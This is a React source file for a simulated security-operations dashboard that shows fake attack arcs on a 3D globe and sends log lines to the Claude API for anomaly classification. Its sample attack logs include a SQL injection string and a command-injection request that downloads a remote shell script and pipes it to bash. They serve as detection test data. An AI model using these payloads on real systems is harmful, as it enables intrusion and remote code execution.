import { useState, useEffect, useRef, useCallback } from "react";
import Globe from "react-globe.gl";
import { jsPDF } from "jspdf";
import { Activity, ShieldAlert, Zap, Globe as GlobeIcon, Settings, Download, Plus, Server, CheckCircle2, Trash2, Upload, Target, ShieldOff, Database, ServerCrash, Search, BookOpen, Skull, Map, Crosshair, ZoomIn } from "lucide-react";
import "./App.css";

// ─── DATA & MOCKS ─────────────────────────────────────────
const DEFAULT_SIGNATURES = [
  { id: 1, category: "SQL Injection", severity: "critical", mitre: "T1190", pattern: "UNION SELECT, OR 1=1, DROP TABLE", example: "GET /api?id=1' UNION SELECT", active: true },
  { id: 2, category: "DDoS / Flood", severity: "critical", mitre: "T1498", pattern: "requests/sec > 5000", example: "12.34.56.78 req/s > 8000", active: true }
];

const NORMAL_LOGS = ["GET /api/users/profile HTTP/1.1 — 200 OK", "POST /api/auth/login HTTP/1.1 — 200 OK — user: alice", "GET /dashboard HTTP/1.1 — session valid"];
const ATTACK_LOGS = ["GET /api?id=1' UNION SELECT username FROM users", "SSH login failed: attempt 47/100", "POST /api/exec?cmd=;curl+http://185.234/x.sh|bash"];
const SEV_COLOR = { critical: "#ef4444", high: "#f97316", medium: "#f59e0b", low: "#22c55e", normal: "#3b82f6" };

const LAYERS_DB = {
  ddos: Array.from({length: 40}).map((_,i) => ({ lat: (Math.random()-0.5)*160, lng: (Math.random()-0.5)*360, type: "DDoS Botnet", color: "#f97316", rad: 0.6 })),
  malware: Array.from({length: 25}).map((_,i) => ({ lat: (Math.random()-0.5)*160, lng: (Math.random()-0.5)*360, type: "Malware Ops", color: "#ef4444", rad: 0.8 })),
  centers: Array.from({length: 15}).map((_,i) => ({ lat: (Math.random()-0.5)*160, lng: (Math.random()-0.5)*360, type: "Data Center Phase", color: "#3b82f6", rad: 0.4 })),
  outages: Array.from({length: 5}).map((_,i) => ({ lat: (Math.random()-0.5)*160, lng: (Math.random()-0.5)*360, type: "Kinetic Outage", color: "#a855f7", rad: 1.0 }))
};
const MOCK_COORD = Object.values(LAYERS_DB).flat();

// ─── MAIN APP ─────────────────────────────────────────────────────────────────
export default function AnomalyDetector() {
  const [apiKey, setApiKey] = useState(() => localStorage.getItem("anthropic_api_key") || "");
  const [showSettings, setShowSettings] = useState(false);
  
  // URL PARAMETER HYDRATION
  const getUrlParam = (key, defaultVal) => new URLSearchParams(window.location.search).get(key) || defaultVal;
  const [simulationMode, setSimulationMode] = useState(getUrlParam("sim", "true") === "true");
  const [activeLayers, setActiveLayers] = useState(getUrlParam("layers", "centers,ddos").split(",").filter(Boolean));
  const [searchQuery, setSearchQuery] = useState(getUrlParam("spl", ""));

  const [dim, setDim] = useState({ w: window.innerWidth, h: window.innerHeight });
  useEffect(() => {
    const handleResize = () => setDim({ w: window.innerWidth, h: window.innerHeight });
    window.addEventListener("resize", handleResize);
    return () => window.removeEventListener("resize", handleResize);
  }, []);

  const [signatures, setSignatures] = useState(DEFAULT_SIGNATURES);
  const [selectedModel, setSelectedModel] = useState("claude-3-5-sonnet-20241022");
  
  // State
  const [liveMode, setLiveMode] = useState(false);
  const [liveSpeed, setLiveSpeed] = useState(4000);
  const [feed, setFeed] = useState([]);
  const [arcs, setArcs] = useState([]);
  
  // L2 Forecaster State
  const [forecast, setForecast] = useState(null);
  
  // OSINT State
  const [showOsintPanel, setShowOsintPanel] = useState(false);
  const [osintText, setOsintText] = useState("");
  const [isOsintParsing, setIsOsintParsing] = useState(false);

  const liveRef = useRef(false);
  const liveIntervalRef = useRef(null);
  const forecastIntervalRef = useRef(null);
  
  // ── 3D GLOBE REFS & GEOJSON ────────────────────────────────────────────────
  const globeRef = useRef();
  const [countries, setCountries] = useState({ features: [] });
  const [rings, setRings] = useState([]);
  
  useEffect(() => {
    // Fetch world borders for 3D interactions
    fetch("https://unpkg.com/world-atlas@2.0.2/countries-110m.json")
      .then(res => res.json())
      .then(topoData => {
         import("topojson-client").then(topojson => {
            const geoJson = topojson.feature(topoData, topoData.objects.countries);
            setCountries(geoJson);
         });
      })
      .catch(e => console.log("Failed to load map polygons."));
  }, []);

  // ── 1. URL STATE SERIALIZATION ─────────────────────────────────────────────
  useEffect(() => {
    const params = new URLSearchParams();
    params.set("sim", simulationMode);
    if(activeLayers.length > 0) params.set("layers", activeLayers.join(","));
    if(searchQuery) params.set("spl", searchQuery);
    
    // Replace state without refreshing
    const newUrl = `${window.location.pathname}?${params.toString()}`;
    window.history.replaceState({}, "", newUrl);
  }, [simulationMode, activeLayers, searchQuery]);

  useEffect(() => { localStorage.setItem("anthropic_api_key", apiKey); }, [apiKey]);

  // ── 2. SPLUNK-STYLE FILTERING ──────────────────────────────────────────────
  const filteredFeed = feed.filter(f => {
    if (!searchQuery.trim()) return true;
    const q = searchQuery.toLowerCase();
    // Parse pseudo-SPL (severity:critical, index=live)
    if (q.includes("severity:critical")) return f.severity === "critical";
    if (q.includes("is_anomaly:true")) return f.is_anomaly;
    return f.log.toLowerCase().includes(q) || f.threat_type.toLowerCase().includes(q);
  });
  const anomalies = filteredFeed.filter(f => f.is_anomaly).length;

  // ── 3. AI INFERENCE (CORE DETECTOR) ────────────────────────────────────────
  const buildSystemPrompt = useCallback(() => {
    const active = signatures.filter(s => s.active);
    return `You are an expert cybersecurity AI anomaly detection engine. You have been trained on the following attack signatures and patterns:
${active.map(s => `## ${s.category} (MITRE ${s.mitre}) — Severity: ${s.severity.toUpperCase()}\nPatterns to detect: ${s.pattern}`).join("\n")}
TASK: Analyze the provided log entry and determine if it represents an anomaly, attack, or normal behavior.
You MUST respond with ONLY valid JSON:
{ "is_anomaly": true/false, "threat_type": "string", "severity": "critical/high/medium/low/normal", "explanation": "string", "iocs": [] }`;
  }, [signatures]);

  const analyzeLog = useCallback(async (logText) => {
    if (simulationMode || !apiKey) {
      await new Promise(r => setTimeout(r, 400));
      const isSus = /union|failed|curl|\.sh/i.test(logText);
      return { is_anomaly: isSus, threat_type: isSus ? "Suspected Attack" : "Normal Traffic", severity: isSus ? (Math.random()>0.5?"critical":"high") : "normal", log: logText, ts: Date.now(), id: Date.now()+Math.random() };
    }
    try {
      const response = await fetch("https://api.anthropic.com/v1/messages", {
        method: "POST", headers: { "Content-Type": "application/json", "x-api-key": apiKey, "anthropic-version": "2023-06-01", "anthropic-dangerous-direct-browser-access": "true" },
        body: JSON.stringify({ model: selectedModel, max_tokens: 300, system: buildSystemPrompt(), messages: [{ role: "user", content: logText }] })
      });
      const data = await response.json();
      const raw = data.content?.find(c => c.type === "text")?.text || "{}";
      return { ...JSON.parse(raw.replace(/```json|```/g, "").trim()), log: logText, id: Date.now()+Math.random(), ts: Date.now() };
    } catch (e) {
      return { is_anomaly: false, threat_type: "API Error", severity: "critical", log: logText, id: Date.now(), ts: Date.now() };
    }
  }, [apiKey, simulationMode, selectedModel, buildSystemPrompt]);

  // ── 4. L2 PREDICTIVE FORECASTER ────────────────────────────────────────────
  const generateForecast = useCallback(async () => {
    if (feed.length < 5) return;
    if (simulationMode || !apiKey) {
      // Mock Forecaster
      setForecast({ predicted_attack: "Distributed SSH Brute Force", eta: "4 Minutes", probability: 89, explanation: "Escalating trajectory of failed SSH attempts detected across multiple edge nodes."});
      return;
    }
    
    // Real L2 Anthropic Forecasting
    const recentLogs = feed.slice(0, 50).map(f => `[${f.severity}] ${f.threat_type}`).join("\n");
    try {
      const response = await fetch("https://api.anthropic.com/v1/messages", {
        method: "POST", headers: { "Content-Type": "application/json", "x-api-key": apiKey, "anthropic-version": "2023-06-01", "anthropic-dangerous-direct-browser-access": "true" },
        body: JSON.stringify({ 
          model: selectedModel, max_tokens: 300, 
          system: "You are an L2 Predictive SOC Agent. Analyze the recent timeline logs and forecast the impending attack trajectory. Return ONLY valid JSON: { \"predicted_attack\": \"string\", \"eta\": \"string\", \"probability\": 0-100, \"explanation\": \"1 precise sentence\" }", 
          messages: [{ role: "user", content: `Recent event cascade:\n\n${recentLogs}` }] 
        })
      });
      const data = await response.json();
      const raw = data.content?.find(c => c.type === "text")?.text || "{}";
      setForecast(JSON.parse(raw.replace(/```json|```/g, "").trim()));
    } catch(e) { console.error("Forecast Error", e); }
  }, [feed, simulationMode, apiKey, selectedModel]);

  // ── 5. OSINT INTELLIGENCE DRILL (PATTERN AUTO-GEN) ───────────────────────
  const processOsintIntelligence = async () => {
    if(!osintText.trim()) return;
    setIsOsintParsing(true);
    
    if (simulationMode || !apiKey) {
      await new Promise(r => setTimeout(r, 2000));
      setSignatures(prev => [...prev, { id: Date.now(), category: "OSINT Auto-Discovered Vector", severity: "critical", mitre: "T-AUTO", pattern: "Dynamic derived pattern", example: "Mock generated from news clip", active: true }]);
      setIsOsintParsing(false);
      setShowOsintPanel(false);
      setOsintText("");
      return;
    }

    try {
      const response = await fetch("https://api.anthropic.com/v1/messages", {
        method: "POST", headers: { "Content-Type": "application/json", "x-api-key": apiKey, "anthropic-version": "2023-06-01", "anthropic-dangerous-direct-browser-access": "true" },
        body: JSON.stringify({ 
          model: selectedModel, max_tokens: 1000, 
          system: "Extract Threat Intelligence from this cyber article. Return ONLY a valid JSON Array of signature objects matching exactly: [{ \"id\": 99, \"category\": \"string\", \"severity\": \"critical|high\", \"mitre\": \"Txxxx\", \"pattern\": \"regex/pattern string\", \"example\": \"example string\", \"active\": true }]", 
          messages: [{ role: "user", content: osintText }] 
        })
      });
      const data = await response.json();
      const raw = data.content?.find(c => c.type === "text")?.text || "[]";
      const newSigs = JSON.parse(raw.replace(/```json|```/g, "").trim());
      if(Array.isArray(newSigs)) setSignatures(prev => [...prev, ...newSigs.map(s => ({...s, id: Date.now()+Math.random()}))]);
    } catch(e) { alert("Failed to extract specific threat parameters."); }
    setIsOsintParsing(false);
    setShowOsintPanel(false);
    setOsintText("");
  };

  const toggleLive = useCallback(() => {
    if (liveMode) {
      setLiveMode(false); liveRef.current = false; clearInterval(liveIntervalRef.current); clearInterval(forecastIntervalRef.current);
    } else {
      setLiveMode(true); liveRef.current = true;
      liveIntervalRef.current = setInterval(async () => {
        if (!liveRef.current) return;
        const isAttack = Math.random() < 0.35;
        const log = isAttack ? ATTACK_LOGS[Math.floor(Math.random() * ATTACK_LOGS.length)] : NORMAL_LOGS[Math.floor(Math.random() * NORMAL_LOGS.length)];
        const result = await analyzeLog(log);
        setFeed(prev => [result, ...prev].slice(0, 150)); // Keep larger buffer for Splunk

        // Draw Arcs & Rings
        if (result.is_anomaly) {
          const originURL = MOCK_COORD[Math.floor(Math.random() * MOCK_COORD.length)];
          const targetURL = LAYERS_DB.centers[Math.floor(Math.random() * LAYERS_DB.centers.length)] || MOCK_COORD[0];
          setArcs(prev => [...prev, { startLat: originURL.lat, startLng: originURL.lng, endLat: targetURL.lat, endLng: targetURL.lng, color: SEV_COLOR[result.severity] }].slice(-25));
          
          if (result.severity === "critical" || result.severity === "high") {
            setRings(prev => [...prev, { lat: targetURL.lat, lng: targetURL.lng, color: result.severity === "critical" ? "#ef4444" : "#f97316", maxR: result.severity === "critical" ? 8 : 4 }].slice(-10));
          }
        }
      }, liveSpeed);

      // Trigger Forecaster Algorithm every 15 logs processed (roughly)
      forecastIntervalRef.current = setInterval(generateForecast, liveSpeed * 15);
    }
  }, [liveMode, liveSpeed, analyzeLog, generateForecast]);

  const toggleLayer = (l) => setActiveLayers(prev => prev.includes(l) ? prev.filter(x=>x!==l) : [...prev, l]);
  const mapPoints = activeLayers.flatMap(l => LAYERS_DB[l] || []);
  const [hoverD, setHoverD] = useState();

  const handleExportSignatures = () => {
    const el = document.createElement("a"); el.href = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(signatures, null, 2)); el.download = "signatures.json"; el.click();
  };
  const fileInputRef = useRef(null);
  const handleImportSignatures = (e) => {
    const reader = new FileReader(); reader.onload = (ev) => { try { setSignatures(JSON.parse(ev.target.result)); } catch { alert("Invalid JSON") }};
    if(e.target.files[0]) reader.readAsText(e.target.files[0]);
  };

  return (
    <div style={{ position: "relative", width: "100vw", height: "100vh", overflow: "hidden" }}>
      
      {/* ── FULL BLEED GLOBE ── */}
      <div className="wm-globe-container">
        <Globe
          ref={globeRef}
          width={dim.w} height={dim.h} backgroundColor="rgba(0,0,0,0)"
          globeImageUrl="//unpkg.com/three-globe/example/img/earth-dark.jpg" bumpImageUrl="//unpkg.com/three-globe/example/img/earth-topology.png"
          
          // Realistic Atmosphere
          showAtmosphere={true} atmosphereColor="rgba(59, 130, 246, 0.4)" atmosphereAltitude={0.15}
          
          // Nation Polygons (GeoJSON)
          polygonsData={countries.features}
          polygonAltitude={d => d === hoverD ? 0.08 : 0.01}
          polygonCapColor={d => d === hoverD ? 'rgba(59, 130, 246, 0.4)' : 'rgba(10, 15, 20, 0.1)'}
          polygonSideColor={() => 'rgba(0, 0, 0, 0.1)'}
          polygonStrokeColor={() => '#111'}
          onPolygonHover={setHoverD}
          
          // Arcs & Shockwaves
          arcsData={arcs} arcStartLat={d=>d.startLat} arcStartLng={d=>d.startLng} arcEndLat={d=>d.endLat} arcEndLng={d=>d.endLng} arcColor={d=>d.color} arcDashLength={0.4} arcDashGap={0.2} arcDashAnimateTime={2000}
          ringsData={rings} ringColor={t => t => `${t.color}${Math.round(255*(1-t)).toString(16).padStart(2,'0')}`} ringMaxRadius={d => d.maxR} ringPropagationSpeed={3} ringRepeatPeriod={800}
          
          // 3D Hexagonal Pillars
          hexBinPointsData={mapPoints} hexBinPointLat={d=>d.lat} hexBinPointLng={d=>d.lng}
          hexBinPointWeight={d => d.rad * 2} hexBinResolution={3} hexMargin={0.2}
          hexTopColor={d => d.points[0].color} hexSideColor={d => `${d.points[0].color}88`}
          hexBinMerge={true}
          
          // Floating 3D Orbits (Labels)
          htmlElementsData={mapPoints}
          htmlElement={d => {
            const el = document.createElement('div');
            el.innerHTML = `<div style="background:rgba(0,0,0,0.85); border:1px solid ${d.color}; padding:6px 10px; border-radius:4px; color:#c9d1d9; font-family:monospace; font-size:11px; box-shadow:0 0 10px ${d.color}44; white-space: nowrap;"><b style="color:#e6edf3; font-size:12px;">${d.type}</b><br/><span style="color:#8b949e; font-size:9px;">IP: ${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}</span></div>`;
            el.style.pointerEvents = 'none';
            return el;
          }}
          
          autoRotate={!liveMode} autoRotateSpeed={0.8}
        />
      </div>

      {/* ── UI OVERLAY ── */}
      <div className="wm-ui-layer">
        
        {/* TOP HEADER */}
        <div className="wm-header">
          <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
            <div style={{ width: 34, height: 34, borderRadius: 8, display: "flex", alignItems: "center", justifyContent: "center", color: "#3b82f6", background: "rgba(59,130,246,0.1)", border: "1px solid rgba(59,130,246,0.3)" }}><GlobeIcon size={18} /></div>
            <div>
              <div style={{ fontSize: 16, fontWeight: 800, color: "#e6edf3", letterSpacing: "0.08em" }}>Operation Sentinel <span style={{fontSize:9, background:"#ef444422", color:"#ef4444", border:"1px solid #ef444444", padding:"2px 6px", borderRadius:4, verticalAlign:"top", marginLeft: 4}}>L2 SOC</span></div>
            </div>
          </div>
          
          <div style={{ display: "flex", gap: 12, alignItems: "center", pointerEvents:"auto" }}>
            <button onClick={() => setShowOsintPanel(true)} className="glass-panel btn-glowing" style={{ padding: "8px 16px", borderRadius: 6, display:"flex", alignItems:"center", gap: 8, color:"#a855f7", border:"1px solid #a855f7", fontWeight: 700, fontSize:11 }}><BookOpen size={14}/> INGEST OSINT</button>
            <button onClick={toggleLive} className="glass-panel btn-glowing" style={{ background: liveMode ? "rgba(239,68,68,0.15)" : "rgba(59,130,246,0.1)", border: `1px solid ${liveMode ? "#ef4444" : "#3b82f6"}`, color: liveMode ? "#fca5a5" : "#60a5fa", padding: "8px 16px", borderRadius: 6, display: "flex", alignItems: "center", gap: 6, fontWeight: 700, fontSize: 11 }}>
              {liveMode ? <><Activity size={14} /> HALT SCANNING</> : <><Zap size={14} /> INITIALIZE SCAN</>}
            </button>
            <button onClick={() => setShowSettings(!showSettings)} className="glass-panel btn-glowing" style={{ padding: "8px", borderRadius: 6, display:"flex", color:"#8b949e" }}><Settings size={16}/></button>
          </div>
        </div>

        {/* CENTER CANVASES */}
        <div className="wm-main-content">
          
          {/* L2 FORECASTER & MAP LAYERS */}
          <div className="wm-panel-left">
            {/* L2 Forecaster Module */}
            {forecast && (
               <div className="glass-panel" style={{ padding: 16, border: "1px solid #ef4444", background: "rgba(239, 68, 68, 0.1)", boxShadow: "0 0 20px rgba(239, 68, 68, 0.2)", animation: "pulse 2s infinite" }}>
                  <div style={{ fontSize: 10, color: "#fca5a5", fontWeight: 800, letterSpacing: "0.15em", marginBottom: 12, display:"flex", alignItems:"center", gap: 6 }}><Skull size={14}/> L2 THREAT FORECAST</div>
                  <div style={{ fontSize: 18, color: "#ef4444", fontWeight: 800, marginBottom: 8, fontFamily: "monospace" }}>{forecast.predicted_attack}</div>
                  <div style={{ display:"flex", justifyContent:"space-between", marginBottom: 8 }}>
                    <span className="badge" style={{background:"#ef444433", color:"#fca5a5"}}>ETA: {forecast.eta}</span>
                    <span className="badge" style={{background:"#f59e0b33", color:"#fcd34d"}}>PROB: {forecast.probability}%</span>
                  </div>
                  <div style={{ fontSize: 11, color: "#e6edf3", lineHeight: 1.4 }}>{forecast.explanation}</div>
               </div>
            )}

            <div className="glass-panel" style={{ padding: 16 }}>
              <div style={{ fontSize: 10, color: "#60a5fa", fontWeight: 800, letterSpacing: "0.15em", marginBottom: 16 }}>DATA LAYERS</div>
              <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
                <div onClick={()=>toggleLayer("ddos")} className={`layer-card ${activeLayers.includes("ddos") ? "active":""}`}><Target size={14} color="#f97316" style={{marginRight: 10}}/> <span style={{fontSize:12, flex:1, fontWeight:600, color:"#c9d1d9"}}>DDoS Hotspots</span> {activeLayers.includes("ddos") && <span style={{fontSize:10, color:"#f97316"}}>{LAYERS_DB.ddos.length}</span>}</div>
                <div onClick={()=>toggleLayer("malware")} className={`layer-card ${activeLayers.includes("malware") ? "active":""}`}><ShieldAlert size={14} color="#ef4444" style={{marginRight: 10}}/> <span style={{fontSize:12, flex:1, fontWeight:600, color:"#c9d1d9"}}>Malware Origins</span> {activeLayers.includes("malware") && <span style={{fontSize:10, color:"#ef4444"}}>{LAYERS_DB.malware.length}</span>}</div>
                <div onClick={()=>toggleLayer("centers")} className={`layer-card ${activeLayers.includes("centers") ? "active":""}`}><Database size={14} color="#3b82f6" style={{marginRight: 10}}/> <span style={{fontSize:12, flex:1, fontWeight:600, color:"#c9d1d9"}}>Data Centers</span> {activeLayers.includes("centers") && <span style={{fontSize:10, color:"#3b82f6"}}>{LAYERS_DB.centers.length}</span>}</div>
              </div>
            </div>
          </div>

          {/* SPLUNK DATA LAKE */}
          <div className="wm-panel-right" style={{ width: 450 }}>
            <div className="glass-panel" style={{ padding: 16, display: "flex", flexDirection: "column", height: "100%", background: "rgba(10, 15, 20, 0.75)" }}>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 12 }}>
                <div style={{ fontSize: 10, color: "#60a5fa", fontWeight: 800, letterSpacing: "0.15em" }}>IN-MEMORY DATA LAKE</div>
                <div className="badge" style={{ background:"rgba(239,68,68,0.2)", color:"#fca5a5" }}>{anomalies} ALERTS</div>
              </div>

              {/* SPL Search Box */}
              <div style={{ marginBottom: 12, position: "relative" }}>
                 <Search size={14} color="#3b82f6" style={{ position: "absolute", top: 9, left: 10 }} />
                 <input value={searchQuery} onChange={(e) => setSearchQuery(e.target.value)} placeholder="SPL > severity:critical | grep sql" style={{ paddingLeft: "32px!important", fontFamily: "monospace", color: "#60a5fa!important", background: "rgba(0,0,0,0.8)!important", border: "1px solid #1e3a5f!important" }} />
              </div>

              <div className="list-container" style={{ flex: 1, display: "flex", flexDirection: "column", gap: 8 }}>
                {filteredFeed.length === 0 ? (
                  <div style={{ textAlign: "center", padding: 40, color: "#8b949e", fontSize: 11, fontStyle: "italic", opacity: 0.6 }}>Executing remote query projection...</div>
                ) : (
                  filteredFeed.map(f => (
                    <div key={f.id} className="live-item" style={{ padding: "8px 10px", background: "rgba(0,0,0,0.6)", borderLeft: `2px solid ${SEV_COLOR[f.severity]}`, borderRadius: 4 }}>
                      <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 4 }}>
                        <span style={{ fontSize: 10, color: "#8b949e", fontFamily: "monospace" }}>{new Date(f.ts).toLocaleTimeString()}</span>
                        <span style={{ fontSize: 10, color: SEV_COLOR[f.severity], fontWeight: 800, letterSpacing: "0.05em" }}>{f.threat_type}</span>
                      </div>
                      <div style={{ fontSize: 11, color: f.is_anomaly ? "#fca5a5" : "#c9d1d9", wordBreak: "break-all", fontFamily: "monospace", opacity: 0.9 }}>{f.log}</div>
                    </div>
                  ))
                )}
              </div>
            </div>
          </div>
        </div>

        {/* BOTTOM HORIZONTAL STATS */}
        <div className="wm-panel-bottom" style={{ pointerEvents: "auto" }}>
          <div style={{ display:"flex", alignItems:"center", gap: 10 }}>
            <span style={{ fontSize:10, color:"#8b949e", letterSpacing:"0.1em" }}>SPLUNK INDEX SIZE:</span>
            <span style={{ fontSize:16, fontWeight:800, color:"#e6edf3", fontFamily:"monospace" }}>{feed.length}</span>
          </div>
          <div style={{ width: 1, background: "rgba(255,255,255,0.2)" }} />
          <div style={{ display:"flex", alignItems:"center", gap: 10 }}>
            <span style={{ fontSize:10, color:"#8b949e", letterSpacing:"0.1em" }}>ACTIVE POLICIES:</span>
            <span style={{ fontSize:16, fontWeight:800, color:"#60a5fa", fontFamily:"monospace" }}>{signatures.length}</span>
          </div>
          <div style={{ width: 1, background: "rgba(255,255,255,0.2)" }} />
          <div style={{ display:"flex", alignItems:"center", gap: 10 }}>
            <span style={{ fontSize:10, color:"#8b949e", letterSpacing:"0.1em" }}>AI ENGINE:</span>
            <span style={{ fontSize:12, fontWeight:700, color: simulationMode ? "#f59e0b" : "#22c55e" }}>{simulationMode ? "SIMULATION" : "LIVE CLAUDE"}</span>
          </div>
        </div>

        {/* FLOATING MAP CONTROLS */}
        <div className="map-controls">
           <button className="map-btn" title="Target North America" onClick={() => globeRef.current?.pointOfView({ lat: 39.8, lng: -98.5, altitude: 2.0 }, 1500)}><Target size={16} /></button>
           <button className="map-btn" title="Target Europe/Asia" onClick={() => globeRef.current?.pointOfView({ lat: 50.0, lng: 15.0, altitude: 2.5 }, 1500)}><Map size={16} /></button>
           <button className="map-btn" title="Reset View" onClick={() => globeRef.current?.pointOfView({ lat: 0, lng: 0, altitude: 2.5 }, 1000)}><Crosshair size={16} /></button>
        </div>

      </div>

      {/* ── 4. OSINT COPILOT TERMINAL ── */}
      {showOsintPanel && (
        <div className="wm-ui-layer" style={{ zIndex: 2000, background: "rgba(0,0,0,0.8)", backdropFilter: "blur(4px)", pointerEvents: "auto", justifyContent: "center", alignItems: "center" }}>
           <div className="glass-panel" style={{ width: 500, padding: 24, background: "#06070a", border: "1px solid #a855f7" }}>
              <div style={{ fontSize: 14, fontWeight: 800, color: "#e9d5ff", display:"flex", justifyContent:"space-between", marginBottom: 8 }}>
                 <div style={{display:"flex", alignItems:"center", gap:8}}><BookOpen size={16}/> OSINT INTELLIGENCE CO-PILOT</div>
                 <button onClick={() => setShowOsintPanel(false)} style={{ background:"none", border:"none", color:"#8b949e", cursor:"pointer" }}>✕</button>
              </div>
              <div style={{ fontSize: 11, color: "#8b949e", marginBottom: 20, lineHeight: 1.5 }}>
                 Paste raw text from CISA Advisories, HackerNews, or DarkReading. The AI Agent will parse the article for Indicators of Compromise and automatically inject native Signature Policies into your detection engine.
              </div>
              
              <textarea 
                 value={osintText} onChange={e=>setOsintText(e.target.value)} 
                 placeholder="Paste article news clipping here..." 
                 rows={8} style={{ marginBottom: 20, resize: "none" }}
              />
              
              <button 
                 onClick={processOsintIntelligence} disabled={isOsintParsing}
                 className="btn-glowing" style={{ width: "100%", background: isOsintParsing ? "#2d3748" : "rgba(168, 85, 247, 0.2)", border: "1px solid #a855f7", color: "#e9d5ff", padding: "12px", borderRadius: 6, fontWeight: 700, letterSpacing: "0.1em" }}
              >
                 {isOsintParsing ? "EXTRACTING THREAT ARTIFACTS..." : "AUTONOMOUSLY GENERATE POLICIES"}
              </button>
           </div>
        </div>
      )}

      {/* ── 5. SETTINGS OVERLAY ── */}
      {showSettings && (
        <div className="glass-panel" style={{ position: "absolute", top: 70, right: 24, padding: 24, width: 340, zIndex: 1000, background:"rgba(10,15,20,0.95)", pointerEvents:"auto" }}>
          <div style={{ fontSize: 12, fontWeight: 800, color: "#e6edf3", marginBottom: 20, display:"flex", justifyContent:"space-between" }}>
            AGENT CONFIGURATION
            <button onClick={() => setShowSettings(false)} className="btn-glowing" style={{ background:"none", border:"none", color:"#8b949e" }}>✕</button>
          </div>
          
          <div style={{ marginBottom: 16 }}>
            <div style={{ fontSize: 10, color: "#8b949e", marginBottom: 6 }}>THREAT POLICIES (JSON)</div>
            <div style={{ display: "flex", gap: 8 }}>
              <button onClick={handleExportSignatures} className="btn-glowing" style={{ flex: 1, padding: "8px", background:"rgba(59,130,246,0.1)", color: "#60a5fa", border:"1px solid #3b82f6", borderRadius: 4, display:"flex", justifyContent:"center", alignItems:"center", gap:6, fontSize:10, fontWeight:700 }}><Download size={14}/> EXPORT</button>
              <button onClick={() => fileInputRef.current?.click()} className="btn-glowing" style={{ flex: 1, padding: "8px", background:"rgba(34,197,94,0.1)", color: "#22c55e", border:"1px solid #22c55e", borderRadius: 4, display:"flex", justifyContent:"center", alignItems:"center", gap:6, fontSize:10, fontWeight:700 }}><Upload size={14}/> IMPORT</button>
              <input type="file" ref={fileInputRef} onChange={handleImportSignatures} accept=".json" style={{ display: "none" }} />
            </div>
            <div style={{ fontSize: 9, color: "#8b949e", marginTop: 4 }}>Total: {signatures.length} policy rules memory block.</div>
          </div>

          <div style={{ marginBottom: 16, paddingTop: 16, borderTop: "1px solid rgba(255,255,255,0.1)" }}>
            <div style={{ fontSize: 10, color: "#8b949e", marginBottom: 8 }}>L2 CYBER INFERENCE ENGINE</div>
            <div style={{ display: "flex", gap: 8 }}>
              <button onClick={() => setSimulationMode(true)} style={{ flex:1, padding: "8px", background: simulationMode ? "rgba(59,130,246,0.2)" : "transparent", color: simulationMode ? "#60a5fa" : "#8b949e", border: `1px solid ${simulationMode ? "#3b82f6" : "rgba(255,255,255,0.1)"}`, borderRadius: 4, fontSize:10, fontWeight:700 }}>MOCK</button>
              <button onClick={() => setSimulationMode(false)} style={{ flex:1, padding: "8px", background: !simulationMode ? "rgba(239,68,68,0.2)" : "transparent", color: !simulationMode ? "#ef4444" : "#8b949e", border: `1px solid ${!simulationMode ? "#ef4444" : "rgba(255,255,255,0.1)"}`, borderRadius: 4, fontSize:10, fontWeight:700 }}>LIVE CLAUDE API</button>
            </div>
          </div>

          {!simulationMode && (
            <>
              <div style={{ marginBottom: 12 }}>
                <div style={{ fontSize: 10, color: "#8b949e", marginBottom: 6 }}>API KEY</div>
                <input type="password" placeholder="sk-ant-..." value={apiKey} onChange={e => setApiKey(e.target.value)} />
              </div>
              <div style={{ marginBottom: 16 }}>
                 <div style={{ fontSize: 10, color: "#8b949e", marginBottom: 6 }}>MODEL OPTIMIZATION</div>
                 <select value={selectedModel} onChange={e => setSelectedModel(e.target.value)}>
                   <option value="claude-3-5-sonnet-20241022">Sonnet 3.5 (Primary)</option>
                   <option value="claude-3-opus-20240229">Opus 3 (Deep Analysis)</option>
                 </select>
              </div>
            </>
          )}

          <div style={{ paddingTop: 16, borderTop: "1px solid rgba(255,255,255,0.1)" }}>
            <div style={{ fontSize: 10, color: "#8b949e", marginBottom: 6, display: "flex", justifyContent: "space-between" }}>
              <span>DATA LAKE POLLING SPEED</span><span>{Math.round(liveSpeed / 1000)}s</span>
            </div>
            <input type="range" min="500" max="10000" step="500" value={liveSpeed} onChange={e => setLiveSpeed(Number(e.target.value))} style={{ padding: "0!important", height: 4 }} />
          </div>
        </div>
      )}

    </div>
  );
}
